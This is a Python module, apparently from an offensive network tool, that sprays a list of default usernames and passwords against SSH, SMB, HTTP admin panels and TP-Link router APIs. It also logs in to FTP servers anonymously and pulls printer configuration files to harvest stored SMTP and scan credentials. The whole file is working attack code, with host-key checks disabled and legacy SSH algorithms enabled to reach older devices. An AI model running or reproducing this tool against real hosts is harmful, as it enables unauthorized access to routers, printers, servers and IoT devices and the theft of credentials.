"""
spray.py — Default credential spray over SSH, SMB, HTTP admin panels,
           plus anonymous FTP / printer config harvest and IoT-specific logins.
"""

import json, socket, subprocess, threading, time, re
from . import tui, logger

# ── default credential lists ──────────────────────────────────────────────────
DEFAULT_CREDS = [
    ("admin",        "admin"),
    ("admin",        "password"),
    ("admin",        ""),
    ("admin",        "1234"),
    ("admin",        "123456"),
    ("admin",        "access"),       # Brother printers default
    ("admin",        "Admin"),
    ("root",         "root"),
    ("root",         "toor"),
    ("root",         ""),
    ("root",         "password"),
    ("administrator","admin"),
    ("administrator","password"),
    ("administrator",""),
    ("user",         "user"),
    ("guest",        "guest"),
    ("cisco",        "cisco"),
    ("pi",           "raspberry"),
    ("ubnt",         "ubnt"),
    ("support",      "support"),
    ("service",      "service"),
]

HTTP_ADMIN_PATHS = [
    "/",
    "/admin",
    "/login",
    "/manager/html",        # Tomcat
    "/web",
    "/cgi-bin/luci",        # OpenWRT
    "/admin/administrator_settings.html",  # Brother printers
]

HTTP_ADMIN_PORTS = [80, 8080, 8443, 443, 8888, 8000]
SSH_PORT         = 22
SMB_PORT         = 445
FTP_PORT         = 21


# ── SSH spray ─────────────────────────────────────────────────────────────────
def _try_ssh(ip, user, password, timeout=4):
    # First try paramiko (handles modern SSH)
    try:
        import paramiko, logging
        logging.getLogger("paramiko").setLevel(logging.CRITICAL)
        c = paramiko.SSHClient()
        c.set_missing_host_key_policy(paramiko.AutoAddPolicy())
        c.connect(ip, port=SSH_PORT, username=user, password=password,
                  timeout=timeout, allow_agent=False, look_for_keys=False)
        c.close()
        return True
    except Exception:
        pass

    # Fall back to sshpass for old Dropbear / legacy algorithm servers
    import shutil
    if not shutil.which("sshpass"):
        return False
    try:
        r = subprocess.run(
            ["sshpass", "-p", password,
             "ssh", "-o", "StrictHostKeyChecking=no",
             "-o", f"ConnectTimeout={timeout}",
             "-o", "KexAlgorithms=+diffie-hellman-group1-sha1",
             "-o", "HostKeyAlgorithms=+ssh-rsa",
             "-o", "BatchMode=no",
             f"{user}@{ip}", "exit"],
            capture_output=True, timeout=timeout + 2
        )
        return r.returncode == 0
    except Exception:
        return False


def _spray_ssh(hosts, creds, results, verbose):
    ssh_hosts = [h for h in hosts if SSH_PORT in (h.get("ports") or [])]
    for h in ssh_hosts:
        ip = h["ip"]
        for user, pwd in creds:
            if verbose:
                tui.info(f"SSH  {ip}  {user}:{pwd}")
            if _try_ssh(ip, user, pwd):
                entry = {"target": ip, "service": "ssh", "user": user, "secret": pwd}
                results.append(entry)
                tui.success(f"SSH login: {tui.YLW}{ip}{tui.R}  {user}:{pwd}")
                break           # found cred for this host
            time.sleep(0.1)


# ── SMB spray ─────────────────────────────────────────────────────────────────
def _try_smb(ip, user, password, domain="WORKGROUP", timeout=4):
    try:
        import impacket.smbconnection as smb
        conn = smb.SMBConnection(ip, ip, timeout=timeout)
        conn.login(user, password, domain)
        conn.logoff()
        return True
    except Exception:
        return False


def _spray_smb(hosts, creds, results, verbose):
    smb_hosts = [h for h in hosts if SMB_PORT in (h.get("ports") or [])]
    for h in smb_hosts:
        ip = h["ip"]
        for user, pwd in creds:
            if verbose:
                tui.info(f"SMB  {ip}  {user}:{pwd}")
            if _try_smb(ip, user, pwd):
                entry = {"target": ip, "service": "smb", "user": user, "secret": pwd}
                results.append(entry)
                tui.success(f"SMB login: {tui.YLW}{ip}{tui.R}  {user}:{pwd}")
                break
            time.sleep(0.1)


# ── HTTP basic-auth spray ─────────────────────────────────────────────────────
def _try_http(ip, port, path, user, password, timeout=4):
    try:
        import requests
        from requests.auth import HTTPBasicAuth, HTTPDigestAuth
        url = f"{'https' if port == 443 else 'http'}://{ip}:{port}{path}"
        for Auth in (HTTPBasicAuth, HTTPDigestAuth):
            r = requests.get(url, auth=Auth(user, password),
                             timeout=timeout, verify=False,
                             allow_redirects=True)
            if r.status_code not in (401, 403, 404):
                return True
        return False
    except Exception:
        return False


def _spray_http(hosts, creds, results, verbose):
    for h in hosts:
        ip    = h["ip"]
        ports = [p for p in (h.get("ports") or []) if p in HTTP_ADMIN_PORTS]
        for port in ports:
            for path in HTTP_ADMIN_PATHS:
                for user, pwd in creds:
                    if verbose:
                        tui.info(f"HTTP {ip}:{port}{path}  {user}:{pwd}")
                    if _try_http(ip, port, path, user, pwd):
                        entry = {"target": f"{ip}:{port}{path}",
                                 "service": "http", "user": user, "secret": pwd}
                        results.append(entry)
                        tui.success(f"HTTP login: {tui.YLW}{ip}:{port}{path}{tui.R}  {user}:{pwd}")
                        break
                    time.sleep(0.05)


# ── anonymous FTP + printer config harvest ───────────────────────────────────

def _check_ftp_anon(ip: str, timeout: int = 5) -> dict | None:
    """
    Try anonymous FTP login. If it works, look for printer config files
    (CFG-PAGE.TXT, etc.) and pull credentials stored in them (SMTP, scan-to-FTP).
    Returns dict with loot info or None if anonymous login fails.
    """
    import ftplib
    try:
        ftp = ftplib.FTP()
        ftp.connect(ip, FTP_PORT, timeout=timeout)
        ftp.login("anonymous", "anonymous@example.com")
    except Exception:
        return None

    tui.success(f"FTP anonymous login: {tui.YLW}{ip}{tui.R}")
    logger.success(f"FTP anon login: {ip}")
    loot = {"target": ip, "service": "ftp-anon", "user": "anonymous", "secret": "",
            "notes": []}

    # List files
    files = []
    try:
        files = ftp.nlst()
    except Exception:
        pass

    # Pull known printer config files
    config_files = [f for f in files if f.upper() in
                    ("CFG-PAGE.TXT", "CONFIG.TXT", "REPORT.TXT", "NETWORK.CFG")]
    for fname in config_files:
        try:
            lines = []
            ftp.retrlines(f"RETR {fname}", lines.append)
            content = "\n".join(lines)
            logger.info(f"FTP anon {ip}: pulled {fname} ({len(content)} bytes)")

            # Look for SMTP/scan credentials in printer config
            for line in lines:
                if re.search(r"(SMTP|POP3|Email|User|Password|Scan)", line, re.I):
                    stripped = line.strip()
                    if stripped:
                        loot["notes"].append(f"{fname}: {stripped}")
                        tui.info(f"  Config entry: {tui.DIM}{stripped}{tui.R}")
        except Exception:
            pass

    try:
        ftp.quit()
    except Exception:
        pass

    return loot


def _spray_ftp(hosts, results, verbose):
    ftp_hosts = [h for h in hosts if FTP_PORT in (h.get("ports") or [])]
    for h in ftp_hosts:
        ip = h["ip"]
        if verbose:
            tui.info(f"FTP  {ip}  anonymous")
        loot = _check_ftp_anon(ip)
        if loot:
            results.append(loot)


# ── TP-Link / IoT API login ───────────────────────────────────────────────────

def _try_tplink_api(ip: str, password: str = "admin", timeout: int = 5) -> bool:
    """
    TP-Link Archer / EAP series routers expose a JSON RPC API.
    Tries POST /stok=/ds with login params.
    Returns True if stok token is returned (authenticated).
    """
    try:
        import urllib.request, urllib.error, hashlib
        url = f"http://{ip}/stok=/ds"
        # TP-Link uses MD5 of password for some firmware versions
        pwd_md5 = hashlib.md5(password.encode()).hexdigest().upper()
        for pwd_attempt in (password, pwd_md5):
            payload = json.dumps({
                "method": "login",
                "params": {"username": "admin", "password": pwd_attempt}
            }).encode()
            req = urllib.request.Request(url, data=payload,
                                         headers={"Content-Type": "application/json"})
            try:
                with urllib.request.urlopen(req, timeout=timeout) as r:
                    body = r.read().decode(errors="replace")
                    data = json.loads(body)
                    if data.get("error_code") == 0 and "stok" in data.get("result", {}):
                        return True
            except Exception:
                continue
    except Exception:
        pass
    return False


def _spray_iot(hosts, creds, results, verbose):
    """Try IoT-specific API logins for routers, cameras, NVRs."""
    for h in hosts:
        ip = h["ip"]
        ports = h.get("ports") or []
        if 80 not in ports and 8080 not in ports:
            continue

        # TP-Link API (port 80)
        if 80 in ports:
            for _, pwd in creds:
                if verbose:
                    tui.info(f"TP-Link API  {ip}  admin:{pwd}")
                if _try_tplink_api(ip, pwd):
                    entry = {"target": ip, "service": "tplink-api",
                             "user": "admin", "secret": pwd}
                    results.append(entry)
                    tui.success(f"TP-Link API login: {tui.YLW}{ip}{tui.R}  admin:{pwd}")
                    logger.success(f"TP-Link login: {ip} admin:{pwd}")
                    break
                time.sleep(0.1)


# ── orchestrator ──────────────────────────────────────────────────────────────
def spray(hosts: list[dict], services=("ssh", "smb", "http", "ftp", "iot"),
          creds=None, verbose=False) -> list[dict]:
    """
    Spray default creds across discovered hosts.
    Returns list of successful { target, service, user, secret }.
    """
    if creds is None:
        creds = DEFAULT_CREDS

    results = []
    threads = []

    if "ssh" in services:
        t = threading.Thread(target=_spray_ssh,
                             args=(hosts, creds, results, verbose), daemon=True)
        threads.append(t)

    if "smb" in services:
        t = threading.Thread(target=_spray_smb,
                             args=(hosts, creds, results, verbose), daemon=True)
        threads.append(t)

    if "http" in services:
        t = threading.Thread(target=_spray_http,
                             args=(hosts, creds, results, verbose), daemon=True)
        threads.append(t)

    if "ftp" in services:
        t = threading.Thread(target=_spray_ftp,
                             args=(hosts, results, verbose), daemon=True)
        threads.append(t)

    if "iot" in services:
        t = threading.Thread(target=_spray_iot,
                             args=(hosts, creds, results, verbose), daemon=True)
        threads.append(t)

    for t in threads:
        t.start()
    for t in threads:
        t.join()

    return results
